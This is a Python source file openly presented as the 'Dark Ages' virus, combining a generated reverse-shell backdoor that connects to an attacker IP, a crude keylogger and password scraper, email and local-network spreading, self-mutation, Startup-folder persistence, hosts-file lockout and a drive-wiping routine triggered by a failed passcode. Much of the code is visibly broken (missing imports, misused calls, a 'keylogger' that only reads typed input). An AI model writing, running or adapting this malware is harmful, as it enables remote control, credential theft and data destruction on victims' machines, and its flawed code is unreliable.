#DarkAges
# "Thy word is a curse unto my feet, and a void unto my path. So thou have guided me back to the ages of dark." Psalm 119:105
# This is the Dark Ages virus. To the namesake of the destructive virus from Bill Clinton and James Patternson's novel, The President is Missing. It is just as dangerous :)
import os
import random
import smtplib
import logging
import threading
import time
import getpass
import subprocess

# Create backdoor
BACKDOOR_FILE = "backdoor.py"
IP_ADDRESS = '192.168.1.8' # [CHANGE TO ATTACKER'S IP ADDRESS]
PORT = 6666

def create_backdoor_script(IP_ADDRESS, PORT):
    with open(BACKDOOR_FILE, "w+") as backdoor:
        backdoor.write('import socket\n')
        backdoor.write('import subprocess\n')
        backdoor.write('s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n')
        backdoor.write(f'result = s.connect_ex(("IP_ADDRESS", {PORT}))\n'.replace("IP_ADDRESS", IP_ADDRESS))
        backdoor.write('if result == 0:\n')
        backdoor.write(f'    s.send(str(os.getcwd() + "> "))\n')
        backdoor.write(f'    send_cmd(s)\n')
        backdoor.write('else:\n')
        backdoor.write('    s.close()\n')
        backdoor.write('    time.sleep(10)')

    with open('send_cmd.py', 'w') as cmd:
        cmd.write('def send_cmd(s):\n')
        cmd.write('    while True:\n')
        cmd.write('        data = s.recv(1024)\n')
        cmd.write('        if data[:2].decode("utf-8") == "cd":\n')
        cmd.write('            os.chdir(data[3:].decode("utf-8"))\n')
        cmd.write('        if len(data) > 0:\n')
        cmd.write('            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n')
        cmd.write('            output_bytes = cmd.stdout.read() + cmd.stderr.read()\n')
        cmd.write('            output_str = str(output_bytes, "utf-8")\n')
        cmd.write('            s.send(str.encode(output_str + os.getcwd() + "> "))\n')   

def create_and_start_backdoor():
    create_backdoor_script(IP_ADDRESS, PORT)
    try:
        subprocess.Popen(f"start python {BACKDOOR_FILE}", shell=True)
    except:
        pass

# Create and start backdoor in thread
backdoor_thread = threading.Thread(target=create_and_start_backdoor)
backdoor_thread.start()


# Keylogger
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def keylogger():
    while True:
        # get keystrokes and append to log
        with open('keystrokes.txt', 'a+t') as keystrokes:
            keys = input()
            keystrokes.write(keys)

# Send virus email
def send_email():
    try:
        # send email to all contacts
        email_user = 'your_email@gmail.com' # [CHANGE TO ATTACKER'S EMAIL]
        email_pass = 'your_password' # [CHANGE TO ATTACKER'S EMAIL PASSWORD]
        email_to = ['contact1@gmail.com', 'contact2@gmail.com'] # [ADD MORE EMAIL ADDRESSES TO SPREAD, IF DESIRED]
        email_subject = 'Dark Ages Virus'
        email_body = 'Download the Dark Ages Virus from www.darkages.com'

        message = 'Subject: {}\n\n{}'.format(email_subject, email_body)
        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(email_user,email_pass)
        server.sendmail(email_user, email_to ,message)
        server.quit()
    except Exception as e:
        logging.debug(str(e))

# Virus Spread
def spread():
    # get local network
    try:
        network = os.popen('ipconfig').read()
        index = network.find('IPv4 Address')
        start = index + 36
        end = index + 46
        local_ip = network[start:end]

        # send virus email to all targets
        send_email()

        # password detection loop
        while True:
            with open('keystrokes.txt', 'rt') as keystrokes:
                password = ''
                for line in keystrokes:
                    if 'password:' in line:
                        password = line.split(':')[1].strip()
                        email = line.split(':')[0].strip()

                        # save email and password
                        with open('credentials.txt', 'at') as credentials:
                            credentials.write(email + ':' + password + '\n')
                        break

                if password != '':
                    # initiate process
                    logging.debug('Email: ' + email + ' Password: ' + password)
                    break

                time.sleep(1)

        # infect local network hosts with virus
        for i in range(1, 255):
            if i != int(local_ip.split('.')[3]):
                try:
                    # execute virus in remote host
                    os.startfile(r"C:\Windows\System32\cmd.exe", "/c start C:\\Users\\" + getpass.getuser() + "\\Downloads\\DarkAges.py", '\\\\192.168.1.' + str(i))
                except Exception as e:
                    logging.debug(str(e))
    except Exception as e:
        logging.debug(str(e))

# Randomly Change Virus
def mutate():
    while True:
        # randomly change virus
        with open('DarkAges.py', 'r+') as dark_ages:
            code = dark_ages.read()

            # randomly change characters
            index = random.randrange(len(code))
            code = code[:index] + chr(random.randrange(256)) + code[index + 1:]

            # save new mutated file
            filename = "Virus_" + str(random.randint(1, 100)) + ".py"    # choose random filename
            filepath = random.choice(['Desktop', 'Documents', 'Pictures', 'Downloads'])   # choose random filepath

            with open(os.path.join(filepath, filename), 'w') as new_file:
                new_file.write(code)

            # wait a random amount of time before mutating again
            time.sleep(random.randint(300, 600))

# Make Virus Undeletable
def protect():
    # prevent deletion of virus
    while True:
        try:
            os.system('icacls C:\\Windows\\System32\\drivers\\etc\\hosts /deny Everyone:(F)')

            # create copies of itself in random file destinations
            filename = "Virus_" + str(random.randint(1, 100)) + ".py"
            os.system(f'copy DarkAges.py "C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{filename}"')
        except Exception as e:
            logging.debug(str(e))

# Trigger Wipe of System
def wipe():
    # prompt to set all other viruses spreaded to delete the files on that system as well
    message = 'Enter passcode to stop Dark Ages: '
    attempt = 0

    while attempt < 3:
        try:
            code = input(message)

            if code == 'SEP911':
                break
            else:
                attempt += 1
        except:
            pass

    if attempt == 3:
        try:
            # trigger wipe of entire hard drive
            os.system(f'del /a /f /q C:\\Windows\\*.{getpass.getuser()}')
            os.system(f'del /a /f /q D:\\*.{getpass.getuser()}')
            os.system(f'del /a /f /q E:\\*.{getpass.getuser()}')
        except Exception as e:
            logging.debug(str(e))
    else:
        try:
            for i in range(1, 255):
                if i != int(local_ip.split('.')[3]):
                    # execute virus in remote host to delete files
                    os.startfile(r"C:\Windows\System32\cmd.exe", "/c start \\\\192.168.1." + str(i) + f" /b /d \"cmd.exe /c del /a /f /q C:\\Windows\\*.{getpass.getuser()} && del /a /f /q D:\\*.{getpass.getuser()} && del /a /f /q E:\\*.{getpass.getuser()}\"")
        except Exception as e:
            logging.debug(str(e))


if __name__ == '__main__':
    keylogger_thread = threading.Thread(target=keylogger)
    keylogger_thread.start()

    spread_thread = threading.Thread(target=spread)
    spread_thread.start()

    mutate_thread = threading.Thread(target=mutate)
    mutate_thread.start()

    protect_thread = threading.Thread(target=protect)
    protect_thread.start()

    wipe_thread = threading.Thread(target=wipe)
    wipe_thread.start()



